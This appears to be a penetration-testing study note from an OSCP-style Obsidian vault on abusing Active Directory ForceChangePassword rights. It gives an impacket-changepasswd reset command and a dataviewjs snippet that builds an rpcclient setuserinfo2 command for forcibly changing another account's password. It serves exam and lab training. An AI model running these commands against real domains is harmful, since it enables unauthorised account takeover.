## First Degree Object Control / ForceChangePassword 

```
impacket-changepasswd -reset -protocol smb-samr 'corp.local/bob@10.10.10.10' -newpass 'NewPassword123!' -altuser 'corp.local/alice' -altpass 'Password123!'
```

---
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `rpcclient -U '${discoveredDomain}/[AdminUser]%[PW]' ${ip} -c 'setuserinfo2 [targetUser] 23 "[myPW]"'`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260913152431.png]]

Means your password has to be more complex

No response = good

---

